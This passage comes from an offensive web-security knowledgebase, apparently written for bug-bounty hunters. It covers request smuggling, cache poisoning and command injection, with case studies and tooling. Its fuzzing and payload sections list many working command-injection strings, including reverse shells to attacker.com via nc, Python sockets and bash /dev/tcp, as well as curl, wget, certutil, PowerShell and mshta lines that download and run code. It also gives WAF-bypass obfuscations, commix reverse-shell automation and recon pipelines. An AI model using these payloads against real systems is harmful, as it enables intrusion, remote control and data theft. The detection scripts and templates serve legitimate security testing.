// Use mode: 'cors' to intentionally trigger CORS error
// This prevents redirect following in fetch()
fetch('https://example.com/assets', {
    mode: 'cors'
}).catch(() => {
    // Redirect wasn't followed, attack continues
    location = 'https://example.com/'
});
```

---

## Gadget Chains

### Cache Poisoning Gadgets

1. **XSS in unkeyed headers**: `X-Forwarded-Host`, `X-Original-URL`
2. **Open redirect**: Host header reflected in Location
3. **JavaScript resource hijacking**: `og:url`, script src
4. **DOM-based attacks**: `data-site-root` attributes
5. **JSONP callback manipulation**: `callback` parameter

### Request Smuggling Gadgets

1. **Stored request reflection**: Store victim's request including headers/cookies
2. **XSS upgrade**: Make reflected XSS stored via cache
3. **Host header attacks**: Password reset poisoning, internal API access
4. **Web cache deception**: Poison static resources with dynamic content

### Deserialization Gadgets

1. **PHP**: `__destruct()`, `__wakeup()`, `__toString()` in popular libraries
2. **Java**: CommonsCollections, Spring, Hibernate, JBoss
3. **.NET**: ObjectDataProvider, ExpandedWrapper
4. **Python**: `__reduce__()`, `__getstate__()`

---

## Real World Case Studies

### Case Study 1: PayPal Login Page Compromise

**Vulnerability**: Request smuggling + cache poisoning on PayPal's login page

**Chain**:
1. Desync between front-end and back-end servers
2. Cache poisoning of JavaScript file: `fb-all-prod.pp2.min.js`
3. CSP bypass via iframe sub-page without CSP
4. JavaScript execution in context of PayPal login
5. Password theft from Safari/IE users

**Key technique**: Host-header redirect + CSP bypass chain

### Case Study 2: Amazon Shopping List Data Theft

**Vulnerability**: H2.0 desync on amazon.com

**Attack**:
```http
POST /b/ HTTP/2
Host: www.amazon.com
Content-Length: 23

GET /404 HTTP/1.1
X: X
```

**Result**: Back-end ignored Content-Length, treated body as new request. Attacker stored other users' complete requests (including auth tokens) in shopping list.

**Missed opportunity**: Could have created self-replicating desync worm via browser-powered desync.

### Case Study 3: New Relic Internal API Access

**Vulnerability**: Request smuggling -> internal API access

**Chain**:
1. CL.TE desync on login.newrelic.com
2. Smuggled Host header to reach internal systems
3. X-Forwarded-Proto header to fix HTTPS redirects
4. Internal headers leaked via request reflection:
   - `X-nr-external-service`
   - `Server-Gateway-Account-Id`
   - `Service-Gateway-Is-Newrelic-Admin`
5. Full admin access to internal API

### Case Study 4: Mozilla SHIELD System Hijacking

**Vulnerability**: Cache poisoning + X-Forwarded-Host

**Chain**:
1. `X-Forwarded-Host: attacker.com` poisoned cache
2. Firefox SHIELD system fetched recipes from attacker
3. Tens of millions of Firefox users affected
4. Potential for mass extension installation

### Case Study 5: GitHub Fat GET Cache Poisoning

**Vulnerability**: Varnish + Rails fat GET handling

**Attack**:
```http
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```

**Result**: Cache key included GET params but not body. Body overwrote GET parameter. $10k bounty.

---

## Fuzzing Payloads

### Comprehensive Payload List

```
;id
|id
`id`
$(id)
;whoami
|whoami
`whoami`
$(whoami)
;cat /etc/passwd
|cat /etc/passwd
`cat /etc/passwd`
$(cat /etc/passwd)
;nc -e /bin/sh attacker.com 4444
|nc -e /bin/sh attacker.com 4444
`nc -e /bin/sh attacker.com 4444`
$(nc -e /bin/sh attacker.com 4444)
;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
|python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
$(python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);')
;curl http://attacker.com/$(whoami)
|curl http://attacker.com/$(whoami)
`curl http://attacker.com/$(whoami)`
$(curl http://attacker.com/$(whoami))
;wget http://attacker.com/shell -O /tmp/shell
|wget http://attacker.com/shell -O /tmp/shell
`wget http://attacker.com/shell -O /tmp/shell`
$(wget http://attacker.com/shell -O /tmp/shell)
;bash -i >& /dev/tcp/attacker.com/4444 0>&1
|bash -i >& /dev/tcp/attacker.com/4444 0>&1
`bash -i >& /dev/tcp/attacker.com/4444 0>&1`
$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)
```

### Windows Fuzzing Payloads

```
& whoami
| whoami
` whoami`
$(whoami)
& dir
| dir
& type C:\Windows\win.ini
| type C:\Windows\win.ini
& certutil -urlcache -split -f http://attacker.com/shell.exe shell.exe
| certutil -urlcache -split -f http://attacker.com/shell.exe shell.exe
& powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"
| powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"
& mshta http://attacker.com/payload.hta
| mshta http://attacker.com/payload.hta
& rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker.com/payload.sct")'
```

### Blind RCE Fuzzing

```
; sleep 10
| sleep 10
` sleep 10`
$(sleep 10)
& ping -n 10 127.0.0.1
| ping -n 10 127.0.0.1
; nslookup attacker.com
| nslookup attacker.com
` nslookup attacker.com`
$(nslookup attacker.com)
; curl http://attacker.com
| curl http://attacker.com
; wget http://attacker.com
| wget http://attacker.com
```

---

## Automation Workflows

### Recon Pipeline

```bash
# Step 1: Subdomain enumeration
subfinder -d target.com -o subs.txt

# Step 2: Probe live hosts
httpx -l subs.txt -o live.txt -status-code -title -tech-detect

# Step 3: Crawl for endpoints
katana -list live.txt -o endpoints.txt -jc -jsl -kf -aff

# Step 4: Parameter discovery
paramspider -l live.txt

# Step 5: Fuzz for command injection
ffuf -u "FUZZ" -w endpoints.txt -w payloads.txt -X POST

# Step 6: Nuclei scanning
nuclei -l live.txt -t http/vulnerabilities/command-injection/ -t http/vulnerabilities/rce/

# Step 7: OOB interaction monitoring
interactsh-client -v
```

### Commix Automation

```bash
# Automated command injection exploitation
python commix.py -u "http://target.com/page.php?id=1" --level=3

# With shell
python commix.py -u "http://target.com/page.php?id=1" --os-cmd="whoami"

# Reverse shell
python commix.py -u "http://target.com/page.php?id=1" --os-shell
```

### Custom Detection Script

```python
#!/usr/bin/env python3
import requests
import time

TARGET = "http://target.com/endpoint"
PARAM = "input"
DELAY = 10

payloads = [
    f"; sleep {DELAY};",
    f"| sleep {DELAY}",
    f"` sleep {DELAY}`",
    f"$(sleep {DELAY})",
    f"& ping -c {DELAY} 127.0.0.1 &",
]

for payload in payloads:
    start = time.time()
    r = requests.post(TARGET, data={PARAM: payload})
    elapsed = time.time() - start

    if elapsed >= DELAY:
        print(f"[+] Potential RCE with: {payload}")
        print(f"    Response time: {elapsed:.2f}s")
    else:
        print(f"[-] No delay with: {payload}")
```

---

## Recon Methodology

### Target Identification

1. **Technology fingerprinting**:
   - Wappalyzer, BuiltWith, WhatWeb
   - Server headers (`Server`, `X-Powered-By`, `X-AspNet-Version`)
   - Error messages revealing stack traces

2. **Endpoint discovery**:
   - Crawling: `katana`, `gospider`, `hakrawler`
   - Archive history: `waybackurls`, ` gau`
   - JavaScript analysis: `linkfinder`, `jsfinder`
   - API documentation: Swagger, OpenAPI, GraphQL introspection

3. **Parameter discovery**:
   - `paramspider`, `arjun`, `x8`
   - Wordlists: `SecLists/Discovery/Web-Content/burp-parameter-names.txt`

### Injection Point Identification

Look for parameters that:
- Accept file paths (`file`, `path`, `folder`, `dir`)
- Trigger system operations (`ping`, `nslookup`, `dig`, `host`)
- Handle email (`sendmail`, `mail`)
- Process images (`ImageMagick`, `ffmpeg`, `exiftool`)
- Execute code (`eval`, `assert`, `preg_replace` with `/e`)
- Deserialize data (`unserialize`, `ObjectInputStream`)

### Blind Detection Strategy

1. **Time-based**: `sleep`, `ping`
2. **OOB**: DNS, HTTP callbacks via `interactsh`, `burpcollaborator`
3. **Error-based**: Trigger syntax errors, observe error messages
4. **Redirect-based**: Output redirection to web root
5. **Boolean-based**: Conditional command execution with observable side effects

---

## Nuclei Templates

### Template Structure for Command Injection

```yaml
id: command-injection-detection

info:
  name: Command Injection Detection
  author: your-name
  severity: critical
  description: Detects command injection via time delay
  tags: rce, cmdi, oast

requests:
  - method: GET
    path:
      - "{{BaseURL}}/endpoint?param={{payload}}"

    payloads:
      payload:
        - "; sleep 10;"
        - "| sleep 10"
        - "` sleep 10`"
        - "$(sleep 10)"
        - "& ping -c 10 127.0.0.1 &"

    matchers:
      - type: dsl
        dsl:
          - "duration>=10"
```

### OOB RCE Template

```yaml
id: oob-command-injection

info:
  name: OOB Command Injection
  author: your-name
  severity: critical
  tags: rce, cmdi, oast, blind

requests:
  - method: GET
    path:
      - "{{BaseURL}}/endpoint?param=nslookup%20{{interactsh-url}}"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
```

### Request Smuggling Detection

```yaml
id: request-smuggling-cl-te

info:
  name: HTTP Request Smuggling CL.TE
  author: your-name
  severity: high
  tags: smuggling, desync, rce

requests:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 6
        Transfer-Encoding: chunked

        0

        X

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
        condition: and
```

---

## Tools and Scanners

### Primary Tools

| Tool | Purpose | URL |
|------|---------|-----|
| **commix** | Automated command injection exploitation | https://github.com/commixproject/commix |
| **interactsh** | OOB interaction gathering | https://github.com/projectdiscovery/interactsh |
| **nuclei** | Vulnerability scanner | https://github.com/projectdiscovery/nuclei |
| **httpx** | Fast HTTP prober | https://github.com/projectdiscovery/httpx |
| **katana** | Web crawler | https://github.com/projectdiscovery/katana |
| **subfinder** | Subdomain discovery | https://github.com/projectdiscovery/subfinder |
| **naabu** | Port scanner | https://github.com/projectdiscovery/naabu |
| **notify** | Notification framework | https://github.com/projectdiscovery/notify |
| **HTTP Request Smuggler** | Burp extension for smuggling | https://github.com/PortSwigger/http-request-smuggler |
| **Param Miner** | Burp extension for parameter discovery | https://github.com/PortSwigger/param-miner |
| **smuggler** | Python request smuggling tool | https://github.com/defparam/smuggler |
| **cariddi** | Crawler + secrets finder | https://github.com/edoardottt/cariddi |
| **SecLists** | Comprehensive wordlists | https://github.com/danielmiessler/SecLists |

### Burp Suite Extensions

- **HTTP Request Smuggler**: Automated request smuggling detection
- **Param Miner**: Parameter name guessing, cache-busting
- **Turbo Intruder**: Fast HTTP attacks, desync exploitation
- **Logger++**: Enhanced logging for request analysis

### Browser Tools

- **CursedChrome**: Chrome extension for persistent access
- **postMessage-tracker**: postMessage vulnerability detection
- **pp-finder**: Prototype pollution detection

---

## Advanced Research

### HTTP/2 Continuation Flood

HTTP/2 HEADERS frames can be split across multiple CONTINUATION frames. Some implementations have vulnerabilities in handling incomplete header blocks.

### HTTP Connection Contamination

Newer attack class where HTTP connections become "contaminated" with partial request data, leading to request smuggling without traditional desync.

### Browser-Powered Desync Worms

Self-replicating attacks that exploit victims to infect others:
1. Attacker's page causes victim browser to issue desync request
2. Victim's browser executes attacker-controlled JavaScript
3. JavaScript re-issues attack, infecting next victim
4. No user interaction required after initial visit

### Cache Key Injection

When cache keys concatenate components without proper delimiter escaping:
```
# Akamai example:
GET /?x=2 HTTP/1.1
Origin: '-alert(1)-'__

# Cache key: /D/000/example.com/ cid=x=2__Origin='-alert(1)-'__

# Second request collides:
GET /?x=2__Origin='-alert(1)-' HTTP/1.1
# Same cache key, different semantic meaning
```

---

## Bug Bounty Writeups

### Key Findings Summary

| Researcher | Target | Technique | Bounty |
|-----------|--------|-----------|--------|
| James Kettle | PayPal | Request Smuggling + Cache Poisoning + CSP Bypass | $70k+ total |
| James Kettle | Amazon | H2.0 Browser-Powered Desync | Undisclosed |
| James Kettle | New Relic | Request Smuggling -> Internal API | Undisclosed |
| James Kettle | Trello | Request Smuggling -> Stored Request Theft | Undisclosed |
| James Kettle | Mozilla | Cache Poisoning -> SHIELD Hijacking | $1,000 |
| James Kettle | GitHub | Fat GET Cache Poisoning | $10,000 |
| James Kettle | Cloudflare Blog | Hidden Route Poisoning | Undisclosed |
| Artsploit | MITREid Connect | OAuth logo_uri SSRF | CVE-2021-26715 |
| Artsploit | ForgeRock | OAuth redirect_uri Session Poisoning | CVE-2021-27582 |

### Research Methodology

1. **Cracking the Lens**: Targeting HTTP's hidden attack surface
   - Focus on unkeyed inputs, header parsing discrepancies
   - Use Param Miner for automated discovery

2. **HTTP Desync Attacks**: Request smuggling reborn
   - Timeout-based detection for safe testing
   - Early-read technique for connection-locked detection

3. **Browser-Powered Desync**: Client-side desync attacks
   - Cross-domain fetch() for CSD vectors
   - Connection pool poisoning in victim browsers

---

## Payload Collections

### PayloadsAllTheThings - Command Injection

```
# Basic commands
cat /etc/passwd
whoami
id
uname -a

# Chaining
command1; command2
command1 && command2
command1 || command2
command1 | command2
command1 & command2

# Inline execution
original_cmd `cat /etc/passwd`
original_cmd $(cat /etc/passwd)

# Filter bypasses
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
X=$'uname\x20-a'&&$X

# Time-based exfiltration
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi

# DNS exfiltration
for i in $(ls /); do host "$i.dnsbin.zhack.ca"; done
```

### SecLists - Fuzzing Payloads

```
# Command injection fuzzing
;id
|id
`id`
$(id)
;whoami
|whoami
;cat /etc/passwd
|cat /etc/passwd
;nc -e /bin/sh attacker.com 4444
|nc -e /bin/sh attacker.com 4444
;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PayloadBox - Command Injection List

```
<!--#exec cmd="/bin/cat /etc/passwd"-->
;id;
|id
|/usr/bin/id
|id|
||/usr/bin/id|
;id|
;|/usr/bin/id|
`id`
`/usr/bin/id`
a);id
a;id
a);id;
a;id;
a);id|
a;id|
a)|id
a|id
|/bin/ls -al
;system('cat /etc/passwd')
%0Acat%20/etc/passwd
%0A/usr/bin/id
%0Aid
& ping -i 30 127.0.0.1 &
`ping 127.0.0.1`
| id
& id
; id
%0a id %0a
`id`
$;/usr/bin/id
```

---

## WAF Bypasses

### Common WAF Evasion Techniques

```bash
# Case variation (Windows)
wHoAmi
DiR

# Encoding
%3Bcat%20/etc/passwd
%0Acat%20/etc/passwd

# Double URL encoding
%253Bcat%2520/etc/passwd

# Unicode normalization
%uff1b instead of ; (fullwidth semicolon)

# Comment injection
;/**/cat/**//etc/passwd

# Tab instead of space
cat%09/etc/passwd

# Newline injection
cat%0a/etc/passwd

# String concatenation
c'at' /et'c/passw'd
w"ho"am"i"

# Environment variables
cat${HOME:0:1}etc${HOME:0:1}passwd

# Brace expansion
{cat,/etc/passwd}

# Wildcards
/???/??t /???/p??s??

# Hex encoding
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
```

### Cloudflare Bypass

```
# Cloudflare often blocks obvious payloads
# Use legitimate-looking parameters combined with encoding

# JSON content-type bypass
Content-Type: application/json
{"cmd": ";whoami;"}

# XML content-type bypass
Content-Type: application/xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM ";whoami;">]>
<foo>&xxe;</foo>
```

### ModSecurity Bypass

```
# Comment between command and argument
cat/**//etc/passwd

# Null byte (legacy)
cat%00/etc/passwd

# Using $IFS
cat$IFS/etc/passwd
```

---

## Detection Techniques

### Time-Based Detection

```python
import requests
import time

def detect_time_based(url, param, payload, threshold=5):
    data = {param: payload}
    start = time.time()
    requests.post(url, data=data)
    elapsed = time.time() - start
    return elapsed >= threshold

# Test payloads
test_payloads = [
    "; sleep 5;",
    "| sleep 5",
    "` sleep 5`",
    "$(sleep 5)",
    "& ping -c 5 127.0.0.1 &",
    "; ping -n 5 127.0.0.1 ;",
]
```

### OOB Detection

```python
import requests
from interactsh.client import InteractshClient

client = InteractshClient()
url = client.register()

# Use interactsh URL in payload
payload = f"; nslookup {url};"
requests.post(target, data={"param": payload})

# Poll for interactions
interactions = client.poll()
if interactions:
    print("[+] OOB interaction detected - RCE confirmed")
```

### Error-Based Detection

```python
# Trigger syntax errors that reveal command execution
error_payloads = [
    ";",
    "|",
    "`",
    "$(",
    "'",
    '"',
]

for payload in error_payloads:
    r = requests.post(url, data={"param": payload})
    if "syntax error" in r.text or "command not found" in r.text:
        print(f"[+] Error-based detection: {payload}")
```

### Blind Confirmation via File Write

```bash
# If web root is known, try writing a file
; echo "RCE_CONFIRMED" > /var/www/html/rce.txt ;

# Then check if file exists
GET /rce.txt HTTP/1.1
Host: target.com
```

---

## References

### Primary Sources

1. **PortSwigger Web Security Academy**
   - OS Command Injection: https://portswigger.net/web-security/os-command-injection
   - Request Smuggling: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
   - Browser-Powered Desync: https://portswigger.net/research/browser-powered-desync-attacks
   - Web Cache Poisoning: https://portswigger.net/research/practical-web-cache-poisoning
   - Web Cache Entanglement: https://portswigger.net/research/web-cache-entanglement
   - Hidden OAuth Attack Vectors: https://portswigger.net/research/hidden-oauth-attack-vectors

2. **Payload Collections**
   - PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
   - PayloadBox: https://github.com/payloadbox/command-injection-payload-list
   - SecLists: https://github.com/danielmiessler/SecLists

3. **Knowledge Bases**
   - HackTricks: https://book.hacktricks.wiki/en/pentesting-web/command-injection.html
   - OWASP: https://owasp.org/www-community/attacks/Command_Injection
   - GTFOBins: https://gtfobins.github.io/
   - LOLBAS: https://lolbas-project.github.io/

4. **ProjectDiscovery Tools**
   - Nuclei: https://github.com/projectdiscovery/nuclei
   - Interactsh: https://github.com/projectdiscovery/interactsh
   - Httpx: https://github.com/projectdiscovery/httpx
   - Katana: https://github.com/projectdiscovery/katana
   - Subfinder: https://github.com/projectdiscovery/subfinder
   - Naabu: https://github.com/projectdiscovery/naabu
   - Notify: https://github.com/projectdiscovery/notify
   - Uncover: https://github.com/projectdiscovery/uncover
   - Dnsx: https://github.com/projectdiscovery/dnsx
   - MapCIDR: https://github.com/projectdiscovery/mapcidr
   - ASNMap: https://github.com/projectdiscovery/asnmap
   - CDNCheck: https://github.com/projectdiscovery/cdncheck
   - TLSx: https://github.com/projectdiscovery/tlsx
   - Alterx: https://github.com/projectdiscovery/alterx

5. **Burp Extensions**
   - HTTP Request Smuggler: https://github.com/PortSwigger/http-request-smuggler
   - Param Miner: https://github.com/PortSwigger/param-miner

6. **Browser Security**
   - CursedChrome: https://github.com/mandatoryprogrammer/CursedChrome
   - postMessage Tracker: https://github.com/fransr/postMessage-tracker
   - pp-finder: https://github.com/yeswehack/pp-finder
   - Client-Side Prototype Pollution: https://github.com/BlackFan/client-side-prototype-pollution

7. **Writeups & Research**
   - Cracking the Lens: https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface
   - Command Injection Guide: https://infosecwriteups.com/command-injection-and-rce-exploitation-guide-5d2f4c7b1e3a
   - Advanced RCE Techniques: https://medium.com/@filedescriptor/advanced-command-injection-and-rce-techniques-2f4d7c1b5e3d
   - Bug Bounty RCE: https://github.com/0xspade/bugbounty/tree/master/rce
   - Cariddi: https://github.com/edoardottt/cariddi

---

> **Disclaimer**: This knowledgebase is for authorized security testing and educational purposes only. Always obtain proper authorization before testing any system. The techniques described here can cause serious harm if used maliciously.

> **License**: Research-grade reference material. Attribution to original researchers and sources is required when using this material.
